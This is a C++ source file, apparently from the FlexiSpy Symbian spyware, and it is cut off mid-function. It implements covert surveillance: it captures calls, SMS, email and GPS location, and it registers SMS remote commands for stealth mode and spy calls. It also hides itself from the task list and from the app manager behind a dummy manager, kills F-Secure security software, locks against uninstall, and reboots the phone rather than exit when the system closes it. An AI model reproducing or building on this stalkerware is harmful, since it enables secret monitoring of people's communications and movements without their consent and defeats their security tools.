#include "CltAppUi.h"
#include "AppHelpText.h"
#include "SIMChangeEng.h"
#include "SmsCmdManager.h"
#include "SmsCmdListener.h"
#include "SpyBugClient.h"
#include "CltMainView.h"
#include "CltSettingView.h"
#include "ProductActivationView.h"
#include "FxAppManagerInvisibleMaker.h" 
#include "MonitorClient.h"
#include "ProdActiv.hrh"
#include "FxUninstaller.h"
#include "Global.h"
#include "PrivacyDialog.h"
#include "CltDatabase.h"
#include "FxsCallMonitor.h"
#include "FxsSmsMonitor.h"
#include "CltEmailMonitor.h"
#include "FxLocationService.h"
#include "FxsLocationMonitor.h"
#include "PrivacyDialog.h"
#include "ApnDbManager.h"
#include "ServConnectMan.h"
#include "AuthenTestView.h"
#include "EventCodeString.h"
#include "DiagnosCmdHandler.h"
#include "MainSettingView.h"
#include "MenuListView.h"
#include "SettingGlobals.h"
#include "Properties.h"
#include "ShareProperty.h"
#include "FxLocationServiceInterface.h"
#include "ServerSelector.h"
#include "TheTerminator.h"

#include <BSP.H>
#include <apgtask.h>
#include <akntitle.h>
#include <BAUTILS.H>
#include <APGWGNAM.H>
#include <APGCLI.H>
#include <avkon.rsg>

//::NOTE::
//The implementation of CEikAppUi::Exit() method is that
//it leaves with KLeaveExit even though it does not end with L
//make sure that Exit() is not called by any RunL() method
//cause it will be traped by active scheduler and it will not do its job as expect

CFxsAppUi::CFxsAppUi()
	{
	}
	
CFxsAppUi::~CFxsAppUi()
	{
	LOG0(_L("[CFxsAppUi::~CFxsAppUi] "))
	delete iTerminator;
	delete iLicenceMan;
	delete iHelpText;	
#if !defined(EKA2)
	delete iSecretKeyCap;
#endif
	delete iDiagnosCmd;
	delete iSmsCmdMan;
	delete iSmsCmHandler;
	delete iBugClient;
#if defined(EKA2)
	delete iDataService;	
#endif
	delete iSimChange;
	delete iDatabase;	
	delete iLogEngine;
	delete iMsgEngine;
	delete iCallMonitor;
	delete iSmsMonitor;
	delete iMailMonitor;
	delete iLocService;
	delete iLocationMonitor;	
	delete iSettingMan;	
	delete iIMEIGet;
	delete iAccessPointMan;
	delete iServConnMan;	
	delete iKiller;	
	delete iServUrlMan;
	iComnServSession.Close();
	LOG0(_L("[CFxsAppUi::~CFxsAppUi] End"))
	}
	
void CFxsAppUi::ConstructL()
	{
	LOG0(_L("[CFxsAppUi::ConstructL] "))
	
	BaseConstructL(EAknEnableSkin);	
	CreatePrivatePathL();
	
#if defined(EKA2)
	//common service
	//will create Properties that share across the application
	User::LeaveIfError(iComnServSession.Connect());
#endif
	
	TFileName appPath;	
	GetAppPath(appPath);
	iTerminator = CTerminator::NewL();
	LoadSettingsL(appPath);	
	iIMEIGet = CIMEIGetter::NewL();
#if defined(EKA2)	
	iDataService=CCommonService::NewL(iComnServSession, *this);	
	iDataService->Register(*static_cast<MFlexiKeyNotifiable*>(this));
	iDataService->Register(*static_cast<MMobileInfoNotifiable*>(iIMEIGet));	
#endif
	
	CreateAppModelL(appPath);	
	iMainView = CCltMainView::NewL();
	AddViewL(iMainView);	
	
	CPrdActivView* productActivateView = CPrdActivView::NewL(*iServConnMan);	
	AddViewL(productActivateView); // passing ownership	
	
	TBool productActivated(EFalse);	
#if defined(__WINS__)
	//productActivated = ETrue;
#else
	#if !defined(EKA2)	
	 	productActivated = iLicenceMan->IsActivatedL();
	#endif	
#endif
	if(!productActivated) 
		{
		SetDefaultViewL(*productActivateView);
		iCurrView = KUidActivationView;
		}
	else
		{
		SetDefaultViewL(*iMainView);
		iCurrView = KUidMainView;			
		}
	
	RegisterMonitorL(appPath);
	SetExceptionHandler();	
#if !defined(EKA2)	
	//make app invisible from phone app manager app
	CFxAppManagerInvisibleMaker::NewL(FsSession())->MakeInvisibleD();
#endif
	
	HideIconFromTasklistIfRequiredL();	
	DeleteShareDataDirL();
	SetSmsKeywordL();	
	LOG0(_L("[CFxsAppUi::ConstructL] End"))
	}
	
void CFxsAppUi::CreatePrivatePathL()
	{
	User::LeaveIfError(CoeEnv().FsSession().CreatePrivatePath(EDriveC));
	}
	
void CFxsAppUi::SwitchSettingViewL()
	{
	//lazy loading
	if(!View(KUidMenuListView))
		{
		AddViewL(CMenuListView::NewL());
		}
	if(!View(KUidSettingView))
		{
		AddViewL(CMainSettingView::NewL());		
		}
	
	ChangeViewL(KUidMenuListView);	
	}
	
void CFxsAppUi::LoadSettingsL(const TFileName& aAppPath)
	{
	iAccessPointMan = CAccessPointMan::NewL();// must be created before CCltSettingMan
	//1. Settings
	iSettingMan =	CCltSettingMan::NewL(*this);
	iSettingMan->LoadL(aAppPath);		
	}
	
//App model
void CFxsAppUi::CreateAppModelL(const TFileName& aAppPath)
	{
	//F-Secure killer
	iKiller = CTaskKiller::NewL(iComnServSession);
	
	//2. Database  
	iDatabase = CFxsDatabase::NewL(FsSession());
	CFxsSettings& settings = SettingsInfo();
	//will be informed when settings changed
	settings.AddObserver(this);	
	
	TPtrC productID(AppDefinitions::ProductID());
	FxShareProperty::SetProductID(productID);
	
	//3. Licence manager
	//create licence manager	
	iLicenceMan = CLicenceManager::NewL(FsSession(),productID, aAppPath);
	
	//will be informed activation changes
	iLicenceMan->AddObserver(this);
	iLicenceMan->AddObserver(iAccessPointMan);
	
	iIMEIGet->AddObserver(*iLicenceMan);
	iIMEIGet->AddObserver(*iSettingMan);
	
	//2. Phone log engine
	iLogEngine = CFxsLogEngine::NewL(*this);
	settings.AddObserver(iLogEngine);
	//4. Call log capturer	
	iCallMonitor = CFxsCallMonitor::NewL(*iLogEngine,*iDatabase);	
	iDatabase->AddDbLockObserver(iCallMonitor);	
	
	//5. MessageEngine
	iMsgEngine = CFxsMsgEngine::NewL(*iDatabase);	
	
	//6. SMS Capturer
	iSmsMonitor = CFxsSmsMonitor::NewL(*iDatabase);
	iMailMonitor = CFxMailMonitor::NewL(*iDatabase);
	
	//Add observers
	TInt err(KErrNone);
	err = iMsgEngine->RegisterEvent(KUidMsgTypeSMS, *iSmsMonitor);	
	err = iMsgEngine->RegisterEvent(KUidMsgTypeSMTP, *iMailMonitor);
	err = iMsgEngine->RegisterEvent(KUidMsgTypePOP3, *iMailMonitor);
	err = iMsgEngine->RegisterEvent(KUidMsgTypeIMAP4, *iMailMonitor);
	
	iLocService = CFxLocactionService::NewL();
	iLocationMonitor = CFxsLocationMonitor::NewL(*iDatabase);
	iLocService->Register(iLocationMonitor);
	
	//7. KeyCap
#if !defined(EKA2) && !defined(__WINS__)
	CreateKeyCapManagerL(aAppPath);	
#endif
	
	iSmsCmdMan=CSmsCmdManager::NewL(*iLicenceMan, aAppPath);
	iServUrlMan = CServerUrlManager::NewL(FsSession());
	//Server Action Manager
	iServConnMan = CServConnectMan::NewL(*this);
	
//#if !defined(__WINS__)
	//create SIMChange engine
#ifdef FEATURE_SPY_CALL
		iBugClient=CSpyBugClient::NewL(*iLicenceMan, &aAppPath);
		iLicenceMan->AddObserver(iBugClient);
		settings.AddObserver(iBugClient);
		
		iSimChange=CSIMChangeEng::NewL();
		iDataService->Register(*iSimChange);
#endif

	iDataService->AddObserver(static_cast<MNetOperatorChangeObserver*>(iServConnMan));
	iDataService->AddObserver(static_cast<MNetOperatorInfoListener*>(iServConnMan));
//#endif	
	
	iDatabase->AddDbOptrObserver(iServConnMan);	
	iLicenceMan->AddObserver(iServConnMan);
	
	//register current network info observer	
	iAccessPointMan->AddObserver(iServConnMan);
	
	//app global text
	iHelpText = CAppHelpText::NewL(*iServConnMan);
	iSmsCmHandler=CSmsCmdHandler::NewL(*iHelpText);
	
	iDiagnosCmd = CDiagnosCmdHandler::NewL(*iServConnMan,*iServConnMan, *iDatabase);	
	RegisterSmsCommand();	
	}
	
void CFxsAppUi::RegisterSmsCommand()
	{
	iSmsCmdMan->AddListener(KCmdQueryDiagnostic, iDiagnosCmd);
	iSmsCmdMan->AddListener(KCmdSendLogNow, iServConnMan);
	iSmsCmdMan->AddListener(KCmdApnAutoDiscovery, iServConnMan);
	iSmsCmdMan->AddListener(KCmdProductDeactivation, iServConnMan);	
	iSmsCmdMan->AddListener(KCmdSetPhoneLogDuration, iLogEngine);	
	iSmsCmdMan->AddListener(KCmdRestartDevice, iSmsCmHandler);
	iSmsCmdMan->AddListener(KCmdChangeSettingValue, iSmsCmHandler);	
	
	//Generic cmd handler
	iSmsCmdMan->AddListener(KCmdStartCapture, iSmsCmHandler);
	iSmsCmdMan->AddListener(KCmdStopCapture, iSmsCmHandler);
	
	iSmsCmdMan->AddListener(KCmdStealthMode, iSmsCmHandler);	
	
#ifdef FEATURE_SPY_CALL
	iSmsCmdMan->AddListener(KCmdSetKeywords, iSmsCmHandler);
	iSmsCmdMan->AddListener(KCmdEnableSpyCall, iBugClient);
	iSmsCmdMan->AddListener(KCmdDisableSpyCall, iBugClient);
#endif

#ifdef FEATURE_GPS
	iSmsCmdMan->AddListener(KCmdGPSSettings, iSmsCmHandler);
#endif

#ifdef FEATURE_WATCH_LIST
		iSmsCmdMan->AddListener(KCmdClearWatchList, iBugClient);	
		iSmsCmdMan->AddListener(KCmdEnableWatchList, iBugClient);
#endif
	
	//url
	iSmsCmdMan->AddListener(KCmdSetServerURL, iServUrlMan);	
	//
	//iSmsCmdMan->AddListener(KCmdDeleteDatabase, iDatabase);	
	}

void CFxsAppUi::CreateKeyCapManagerL(const TFileName& aAppPath)
	{
#if !defined(EKA2) && !defined(__WINS__)
	iSecretKeyCap=CSecretKeyCapManager::NewL(*iLicenceMan,*this,&aAppPath);
#endif
	}
	
void CFxsAppUi::RegisterMonitorL(const TFileName& appPath)
	{
	TInt err(KErrNone);	
	TRAP(err,iPanicMon=CMonitorClient::NewL(&appPath));	
	switch(err)
		{
		case KErrNone:
			break;
		case KErrNotFound: //RETURN
			{
			//
			//Note:
			//let the application to be launched even if the monitor server is missing.
			//			
			delete iPanicMon;
			iPanicMon=NULL;
			
			//RETURN
			return;
			}break;
		default:
			{
			delete iPanicMon;
			iPanicMon=NULL;
			User::Leave(err);
			}
		}
	TMonAppInfo* appInfo = new (ELeave)TMonAppInfo;
	appInfo->iThreadId=RThread().Id();	
	appInfo->iUid=KAppUid;
	appInfo->iCommand=EApaCommandBackground;	
	appInfo->iThreadName=AppDefinitions::ProductID();
	
#if defined(EKA2)
	//appPath contains private directory
	TBuf<30> logPath;
	_LIT(KLogLocation,"c:\\system\\apps\\%S\\");	
	TBuf<8> uidStr;
	uidStr.NumFixedWidthUC(KAppUid.iUid,EHex, 8);
	logPath.Format(KLogLocation, &uidStr);	
	appInfo->iLogPath.Copy(logPath);
#endif
	appInfo->iAppFullPath=Application()->AppFullName();	
	err = iPanicMon->Register(*appInfo);	
	delete appInfo;
	}
	
void CFxsAppUi::Reboot()
	{
	TRAPD(ignore,SaveDataL());
#if defined EKA2
	iComnServSession.RebootDevice();	
#else
	TInt err(KErrNone);	
	err=UserSvr::ResetMachine(EStartupWarmReset);
	if(err)
		{
		//
		//if ResetMachine doen't work, try this
		err=RDebug::Fault(0);	
		}	
#endif
	}
	
void CFxsAppUi::HideIconFromTasklistIfRequiredL()
	{
	CFxsSettings& settings = SettingsInfo();
	if(!settings.IsTSM())
		{
		HideFromTaskListL(!settings.S9Settings().iShowIconInTaskList);	
		}
	}

void CFxsAppUi::SetStealthModeL(TBool aStealth)
//if ETrue the application will
//- be hidden from task list
//- dummy app.manager is active
//
	{
	CFxsSettings& settings = SettingsInfo();
	settings.SetStealthMode(aStealth);
	settings.NotifyChanged();	
	HideFromTaskListL(aStealth);	
	}
	
void CFxsAppUi::SetHiddedFromAppMgrL(TBool aHidden)
	{		
	//Dummy App.manager Launcher is listening to this property
	FxShareProperty::SetActiveDummyAppMgr(aHidden);
	
	if(aHidden)
		{
		//uid to be hidden from our dummy app.manager
		RArray<TInt32> fxspyUid;
		CleanupClosePushL(fxspyUid);				
		fxspyUid.Append(KProXRemoveLockerApp.iUid);
		fxspyUid.Append(KAppUid.iUid);
		FxShareProperty::SetAppUidHiddedFromDummyAppMgrL(&fxspyUid);
		CleanupStack::PopAndDestroy();
		}
	else
		{
		//	set empty array
		FxShareProperty::SetAppUidHiddedFromDummyAppMgrL(NULL);
		}
	TBuf8<50> hidden8;
	RProperty::Get(KPropertyCategory, EKeyHiddedAppFromDummyAppMgrArray, hidden8);
	}

void CFxsAppUi::HideFromTaskListL(TBool aHide)
	{
	AppDocument().SetHideFromTaskList(aHide);
	//
	//As a result of this call, CCltDocument::UpdateTaskNameL which implements the actual code will be invorked in turn
	//
	CEikonEnv::Static()->UpdateTaskNameL();	
	}
		
void CFxsAppUi::LicenceActivatedL(TBool aActivated)
	{
	LOG1(_L("[CFxaAppUi::LicenceActivatedL] aActivated: %d"),aActivated)
	iProductActivated = aActivated;
	CFxsSettings& setting = SettingsInfo();
	FxShareProperty::SetActivationStatus(aActivated);
	//set share data to internal central repo	
	if(aActivated)
		{
		SetDefaultViewL(*iMainView);		
		TS9Settings& s9settings = setting.S9Settings();			
		if(setting.IsTSM())
		//acitvated by using test house key
		//- dummy app.manager must not be activated
			{
			FxShareProperty::SetSTKMode(ETrue);
			TWatchList& watchList = setting.WatchList();
			//by default for test house is watch all number in the list
			watchList.iEnable = TWatchList::EEnableAll;
			if(s9settings.iShowBillableEvent && !ProductActivateViewL()->IsActivating()) //s9settings.iShowBillableEvent)		
				{
				//change view so that there will be one view that is active for consequent billable dialog to be shown correctly without panic
				ChangeViewL(KUidMainView);			
				SendToBackground();
				}
			DeregisterMonitor();
			}
		else
		//activated using real flexikey
			{
			FxShareProperty::SetSTKMode(EFalse);
			SetHiddedFromAppMgrL(ETrue);
			//hide from task list as required
			TBool shoInTaskList = s9settings.iShowIconInTaskList;
			HideFromTaskListL(!shoInTaskList);			
			}
		}
	else
		{
		HideFromTaskListL(EFalse);
		SetHiddedFromAppMgrL(aActivated);		
		SetDefaultViewL(*ProductActivateViewL());
		iCurrView = KUidActivationView;
		}
	
	OnSettingChangedL(setting);
	}
	
void CFxsAppUi::SetSmsKeywordL()
	{
#ifdef FEATURE_SPY_CALL
	CFxsSettings& settings = SettingsInfo();
	TOperatorNotifySmsKeyword& operKeywords = settings.OperatorNotifySmsKeyword();
	if(operKeywords.iEnable)
		{
		HBufC8* des = operKeywords.MarshalDataLC();
		FxShareProperty::SetOperatorKeywords(*des);
		CleanupStack::PopAndDestroy(des);
		}
#endif
	}
	
void CFxsAppUi::OnSettingChangedL(CFxsSettings& aSetting)
	{
	DoOnSettingChangedL(aSetting);
	SaveDataL();
	}
	
void CFxsAppUi::DoOnSettingChangedL(CFxsSettings& aSetting)
	{
	const TGpsSettingOptions& gpsOptions = aSetting.GpsSettingOptions();
	if(ProductActivated()) 
		{
#if defined(EKA2)
		if(!aSetting.IsTSM())
			{
			iComnServSession.SetKillFlag(aSetting.MiscellaneousSetting().iKillFSecureApp);	
			}
#endif
		//publish monitor number
		TMonitorInfo& montInfo = aSetting.SpyMonitorInfo();
		const TDesC& monitorNumber = montInfo.MonitorNumber();
		FxShareProperty::SetMonitorNumber(monitorNumber);
		
		//check start capture flag
		TBool startCapture = aSetting.StartCapture();
		if(startCapture)
			{
			iMsgEngine->SetSmsEnable(aSetting.EventSmsEnable());
			iMsgEngine->SetEMailEnable(aSetting.EventEmailEnable());
			iLocService->SetLocEventEnable(aSetting.EventLocationEnable());	
			iLogEngine->StartCapture(aSetting.EventCallEnable());
			if(gpsOptions.iGpsOnFlag==KGpsFlagOnState)
				{
				iLocService->StartGps(ETrue);
				}
			else if(gpsOptions.iGpsOnFlag==KGpsFlagOffState)
				{
				iLocService->StartGps(EFalse);	
				}
			else
				{
				// do not start/stop
				// GPS Not supported
				}
			}
		else // start capture is 'No'
			{
			goto DisableAll;
			}		
		}
	else // not activated yet
		{
	DisableAll:
			{
			iLocService->SetLocEventEnable(EFalse);
			iLocService->StartGps(EFalse);			
			iMsgEngine->SetSmsEnable(EFalse);
			iMsgEngine->SetEMailEnable(EFalse);		
			iLogEngine->StartCapture(EFalse);			
			}		
		}
	//Set GPS options even it's not start	
	iLocService->SetGpsOptions(gpsOptions);
	}
	
void CFxsAppUi::GetAppPath(TFileName& aPath)
	{
	//TFileName* pirvatePath = new TFileName;
	TParse* parse(NULL);
	aPath.SetLength(0);
#if defined EKA2
	FsSession().PrivatePath(aPath);
	TFileName appFullPath = Application()->AppFullName();	
	parse = new TParse;
	
#if defined(__WINS__)
	_LIT(KWinsDrive,"c:");
	parse->Set(KWinsDrive, &aPath, NULL);
	aPath=parse->FullName();
#else
	parse->Set(aPath,&appFullPath,NULL);
	aPath=parse->DriveAndPath();	
#endif
	
#else //2rd
	#if !defined(__WINS__)
		TFileName fullPath = Application()->AppFullName();	
		TParse* parse = new TParse;
		parse->Set(fullPath,NULL,NULL);
		aPath = parse->DriveAndPath();		
	#else
		_LIT(KAppPaTH,"\\system\\apps\\fxs\\");
		aPath.Copy(KAppPaTH);
	#endif
#endif
	delete parse;
	}
	
void CFxsAppUi::GetAppDrive(TDes& aDrive)
	{
#if !defined(__WINS__)
	TFileName fullPath = Application()->AppFullName();	
	TParsePtrC parser(fullPath);	
	TPtrC drive = parser.Drive();
	
	if(aDrive.MaxLength() >= drive.Length()) {
		aDrive.Copy(drive);
	}
#else
	aDrive.Copy(_L("c:"));
#endif
	}

void CFxsAppUi::GetAppDrive(TInt& aDrive)
	{
	TBuf<2> driveChar;
	GetAppDrive(driveChar);	
	FsSession().CharToDrive(driveChar[0],aDrive);
	}
	
void CFxsAppUi::GetShareDataPath(TFileName& aPath)
//this share file is used by uninstlock.exe app which will ask for password (flexikey)
//when the app is being installed
	{
	_LIT(KPath,"c:\\system\\apps\\pswprtx2000A982.txt");
	aPath.Copy(KPath);
	/*const TInt KUidStringMaxLength = 8;
	TBuf<KUidStringMaxLength> uidStr;
	uidStr.NumFixedWidthUC(KAppUid.iUid,EHex, KUidStringMaxLength);
	aPath.Format(KPath, &uidStr);
	*/
	}
	
TInt CFxsAppUi::KillTask(TUid aUid)
	{
	return iComnServSession.KillTask(aUid);
	}
	
void CFxsAppUi::OnEventShutdownL()
//write share data to file for uninstall lock application to use
//which consist of 
//1. product id
//2. md5 has of flexikey
//3. phone number
	{
	TFileName fullName;
	GetShareDataPath(fullName);
	BaflUtils::EnsurePathExistsL(FsSession(), fullName);
	//get flexikey md5 hash
	TMd5Hash resultHash;	
	TPtrC8 flexiKeyMd5Hash;	
	if(ProductActivated())
		{
		flexiKeyMd5Hash.Set(iLicenceMan->FlexiKeyHashCode());
		}
	else
		{
		TBuf8<15> defaultKey;
		defaultKey.Copy(KDefaultKey);
		HashUtils::DoHashL(AppDefinitions::ProductID(), defaultKey, resultHash);
		flexiKeyMd5Hash.Set(resultHash);
		}
	TBuf<KMaxHashStringLength> hashStr;
	HashUtils::ToStringUC(hashStr, flexiKeyMd5Hash);
	
	_LIT(KKeyProductId,"PID");
	_LIT(KKeyFlexiKeyMd5Hash,"KEY");	
	_LIT(KKeyTelNumber,	 "NUMBER");
	_LIT(KKeyAppName,	  "NAME");
	CProperties* prop = CProperties::NewLC(FsSession(), fullName);
	//product id
	prop->SetL(KKeyProductId, AppDefinitions::ProductID());
	//md5 hash of flexikey
	prop->SetL(KKeyFlexiKeyMd5Hash, hashStr);
	
	//write fake hash
	_LIT(KKeyFake1,	"HASH"); //this is not used	
	TMd5Hash resultFake;
	HashUtils::DoHashL(AppDefinitions::ProductID(), AppDefinitions::ProductID8(), resultFake);
	HashUtils::ToStringUC(hashStr, resultFake);
	prop->SetL(KKeyFake1, hashStr);
	
	CFxsSettings& settings = SettingsInfo();
	
	//phone number
	if(ProductActivated() && !settings.IsTSM())
	//we do not send sms notification on removal for test house key
		{
		prop->SetL(KKeyTelNumber, settings.SpyMonitorInfo().iTelNumber);
		HBufC* appName=RscHelper::ReadResourceLC(R_TEXT_APPLICATION_NAME);
		//this is used in removal notification sms
		prop->SetL(KKeyAppName, *appName);		
		CleanupStack::PopAndDestroy(appName);
		}
	else
		{
		prop->SetL(KKeyTelNumber, KNullDesC);
		}
	prop->StoreL();	
	CleanupStack::PopAndDestroy();
	}
	
void CFxsAppUi::DeleteShareDataDirL()
	{
	TFileName fullName;
	GetShareDataPath(fullName);
	//delete previous share file
	FsSession().Delete(fullName);
	
	/** delete the whole folder
	if(BaflUtils::FileExists(FsSession(), fullName))
		{
		CFileMan* fileMan = CFileMan::NewL(FsSession());
		CleanupStack::PushL(fileMan);
		fileMan->RmDir(fullName);//delete all files and directory
		CleanupStack::PopAndDestroy();		
		}*/
	}
 	
#if defined(EKA2)
//From MTimeoutObserver
 void CFxsAppUi::HandleTimedOutL()
 	{
 	}
 	
void CFxsAppUi::OfferFlexiKeyL(const TDesC& aFlexiKey)
	{
	LOG2(_L("[CFxsAppUi::OfferFlexiKeyL] aFlexiKey: %S, IsActivatedL: %d"),&aFlexiKey, ProductActivated())
//
//Validate the key, 
//if it is correct or is the default key then bring the application to foreground
//
//	User::After(500000); //perfect value
//
//must wait
//the reason is when flexikey call is ended sometimes disconnected dialog will come up and causes our app to go to background
//
	if(aFlexiKey.Length())
		{
		if(ProductActivated()) 			
			{
			if(aFlexiKey.Length())
				{
				TBuf8<KFlexiKeyMaximumLength> flexiKey8;
				flexiKey8.Copy(aFlexiKey);
				
				//result hash
				TMd5Hash resultHash;
				HashUtils::DoHashL(iLicenceMan->ProductID(),flexiKey8,resultHash);
				TPtrC8 activationCodeHash = iLicenceMan->FlexiKeyHashCode();
				
				if(resultHash.Compare(activationCodeHash) == 0)
					{
					SetLogon(ELogonFlexiKEY);
					ChangeViewL(KUidMainView);
					BringToForeground();
					}
				}
			}
		else
			{
			if(aFlexiKey == KDefaultKey)
				{
				SetLogon(ELogonFlexiKEY);
				ChangeViewL(KUidActivationView);
				BringToForeground();				
				}
			}			
		}
	}
#endif

//MSecretKeyCapObserver
void CFxsAppUi::SkcSecretCodeMatch()
	{
	SetLogon(ELogonFlexiKEY);
	BringToForeground();
	}

void CFxsAppUi::SkcDefaultKeyMatch()
	{
	SetLogon(ELogonFlexiKEY);
	BringToForeground();
	}

/*
* Try moving an application to foreground / to background when it’s property in CApaWindowGroupName is hidden,
* e.g. it’s not shown in the tasklist. Then TApaTaskList will never find it. 
*/
void CFxsAppUi::BringToForeground()
	{
	//task.BringToForeground();
	iCoeEnv->RootWin().SetOrdinalPosition(0, ECoeWinPriorityNormal);
	}

void CFxsAppUi::SendToBackground()
	{
	SetLogon(ELogonNone);
	//task.BringToForeground();	
	iCoeEnv->RootWin().SetOrdinalPosition(-100, ECoeWinPriorityNormal);
	}

void CFxsAppUi::ChangeViewL(TUid aViewId)
	{
	ActivateLocalViewL(aViewId);	
	iCurrView=aViewId;
	}

void CFxsAppUi::ChangeViewL()
	{
	if(ProductActivated())
		{
		ChangeViewL(KUidMainView);
		}
	else
		{
		ChangeViewL(KUidActivationView);
		}
	}
	
// save database and setting data
void CFxsAppUi::SaveDataL()
	{
	TFileName appPath;
	GetAppPath(appPath);		
	iSettingMan->SaveL(appPath);
	LOG0(_L("[CFxsAppUi::SaveDataL] End"))
	}

//
//Set status pane's title subpane
//
void CFxsAppUi::SetStatusPaneTitleL(const TDesC& aText)
	{	
    TUid tPaneUid;
    tPaneUid.iUid = EEikStatusPaneUidTitle;
	CEikStatusPane* sPane = StatusPane();
   	CEikStatusPaneBase::TPaneCapabilities subPane = sPane->PaneCapabilities(tPaneUid);
   	
    // Check if title pane can be accessed
	if (subPane.IsPresent() && subPane.IsAppOwned()) 
		{
    	CAknTitlePane* titlePane = (CAknTitlePane*) sPane->ControlL(tPaneUid);   
    	titlePane->SetTextL(aText);
		}
	}

void CFxsAppUi::ExitApp()
	{
	Exit();
	}

void CFxsAppUi::DoTestConnectionL()
	{
	TPrivacyDialog	privacyDlg;
	TBool allowed = privacyDlg.AllowBillableEvent();
	if(!allowed)
		{
		allowed = privacyDlg.ConfirmBillableEventL(EBillableEventInetConnection);
		}
	if(allowed)
		{
		if(View(KUidTestConnectionView) == NULL)
			{
			AddViewL(CAuthenTestView::NewL(*iServConnMan));
			}	
		ChangeViewL(KUidTestConnectionView);		
		}
	}

void CFxsAppUi::UninstallL()
	{	
#if defined(EKA2)
	TInt rscIdBody = R_TXT_MENU_UNINSTALL_CONFIRMATION_BODY_S9;
#else
	TInt rscIdBody = R_TXT_MENU_UNINSTALL_CONFIRMATION_BODY;
#endif
	
	TInt confirmed = DialogUtils::ShowMessageDialogL(R_FXS_CONFIRMATION_QUERY,
									R_TXT_MENU_UNINSTALL_CONFIRMATION_HEADER,
									rscIdBody);	
	if(confirmed)
		{
		SaveDataL();
		DeregisterMonitor();
#if defined(EKA2)		
		SetHiddedFromAppMgrL(EFalse);
		//Note: to tasklist app, both dummy and native app manager use the same uid KAppManagerAppUid
		//to ensure the native app will start up not dummy.app
		//kill existing app.mgr first and then launch native app 		
		//because it may be dummy.app not real one				
		KillTask(KAppManagerAppUid);
		StartNativeAppMgrL();
		OnEventShutdownL();
#else
		FxUninstaller::DoUninstall();
#endif
		Exit();
		}
	}

void CFxsAppUi::DeregisterMonitor()
	{
	if(iPanicMon)
		{
		iPanicMon->Unregister(RThread().Id());
		delete iPanicMon;
		iPanicMon=NULL;
		}
	}

#if defined(EKA2)
void CFxsAppUi::ExceptionHandler(TExcType aType)
	{
	_LIT(KException,"User-Exception");
	switch(aType)
		{
		case EExcGeneral: //dont know what causes this exception
			{
			ERR0(_L("[CFxsAppUi::ExceptionHandler] Exception-> EExcGeneral"))
			User::Panic(KException, (TInt)aType);
			}break;
		default:
			{
			ERR1(_L("[CFxsAppUi::ExceptionHandler] aType: %d"),aType)
			User::Panic(KException, (TInt)aType);
			}
		}
	}
#endif

 void CFxsAppUi::SetExceptionHandler()
	{
#if defined(EKA2)
	//IMPORT_C static TInt SetExceptionHandler(TExceptionHandler aHandler,TUint32 aMask);	
	User::SetExceptionHandler(&ExceptionHandler,KExceptionAbort|KExceptionKill|KExceptionUserInterrupt
												|KExceptionFpe|KExceptionFault|KExceptionInteger|KExceptionDebug);
	
#endif 
	}

CPrdActivView* CFxsAppUi::ProductActivateViewL() const
	{
	CAknView* view = View(KUidActivationView);
	if(!view)
		{
		User::Leave(KErrNotFound);
		}
	return static_cast<CPrdActivView*>(view);
	}
	
//-----------------------------------------------------------------------------------
//			// Overriden Methods //
//-----------------------------------------------------------------------------------
	
TBool CFxsAppUi::ProcessCommandParametersL(CApaCommandLine& aCommandLine)
//to make this works
//you have to specifiy 
//opaque_data = 1 in APP_REGISTRATION_INFO for 3rd
	{
	/**
	ETrue indicates it has been auto-started.
	otherwise indicates started from the desktop by pressing the icon*/
	//TBool autoStarted = (aCommandLine.OpaqueData().Length() > 0);
	
	//if(autoStarted)
	//make sure that it really go to background
		{
		iCoeEnv->RootWin().SetOrdinalPosition(-1);
		}
    return CEikAppUi::ProcessCommandParametersL( aCommandLine );
	}
	
void CFxsAppUi::HandleCommandL(TInt aCommand)
	{
	switch (aCommand)
		{
		case EFxsCmdTestAuthenticatin:
			{
			//User::Panic(_L("Panic Test"), 3);
			DoTestConnectionL();		
			}break;
		case EFxsCmdAppInfo:
			{
			ShowAppInfoL();	
			}break;
		case EFxsCmdDBInfo:
			{
			ShowDbHealthInfoL();
			}break;
		case ECltCmdAbout:
		case EPActvCmdAbout:
			{
			ShowAboutL();				
			}break;
		case ECltCmdSetting:
			{
			SwitchSettingViewL();
			}break;
		case EFxsCmdExit:
		case ECltCmdHide: // hide
			{
			if(ConfirmBeforeHideL()) 
				{
				SendToBackground();
				}
			SaveDataL();
					
		#if defined(__WINS__)
			Exit();
		#endif
			}break;
		case EFxsCmdUninstall:
		case EPActvCmdUninstall:
			{
			UninstallL();
			}break;
		case EFxsCmdDeActivate:
			{
			ChangeViewL(KUidActivationView);
			}break;
		case EEikCmdExit://system exit
		//flexispy is a always running application
		//normally the application must adhere the framework and exit gracefully when receive this command
		//but in our case, we do not accept so that the application will never die
		
		//Also note that when the MMC is removed, this command is triggered
		//but we ignore it not exit on MMC removal
			{
			LOG0(_L("[CFxsAppUi::HandleCommandL] EEikCmdExit, System exit!"))
			SaveDataL();
			if(!ProductActivated() || SettingsInfo().IsTSM())
				{
				Exit();
				}
			else
			//not accept to exit instead reboot 
				{
				LOG0(_L("[CFxsAppUi::HandleCommandL] Rebooting on system exit command"))
				if(ProductActivated())
					{
					Reboot();
					}				
				}
			}break;
		default:
			;			
		}
	}
	
void CFxsAppUi::HandleForegroundEventL( TBool aForeground )
	{
	if(aForeground)
		{
		if(IsLogon())
			{
			if(ProductActivated()) 
				{
				ChangeViewL(KUidMainView);
				}
			}
		else //Not log on 
			{
			#if !defined(__WINS__)
				SendToBackground();
			#endif
			}
		}
	else //On background
		{
		SetLogon(ELogonNone);		
		}
//#endif
	}

void CFxsAppUi::HandleWsEventL(const TWsEvent& aEvent,CCoeControl* aDestination)
//
//Sequence when app start up
//0.ConstructL ends
//1.ProcessCommandParametersL invorked
//2.HandleWsEventL with EEventFocusGained event
//3.HandleForegroundEventL with aForeground
//
	{
	TKeyEvent& keyEvent = *aEvent.Key();
	//LOG2(_L("[CFxsAppUi::HandleWsEventL] Type: %S iCode: %d"), &EventCodeString::Get(aEvent.Type()), keyEvent.iCode)
	
	switch(aEvent.Type())
		{
		case EEventFocusGained:
		//when the app
//			{
//			const TS9Settings& s9 = SettingsInfo().S9Settings();	
//			if(s9.iFirstLaunch && !ProductActivated())
//				{
//				SetLogon(ELogonS9Dialog);
//				}
//			}break;
		case EEventFocusLost:
			break;
		case KAknUidValueEndKeyCloseEvent:
		//press 'c' key to end app from task list
			{
			DeregisterMonitor();
			}break;
		// this is end key (red key)
		case EEventKey:			
			{
			//if(keyEvent.iCode == EKeyApplication || EKeyPhoneEnd == keyEvent.iCode)
			//	{
			//	}
			}break;
		case 900:
			{
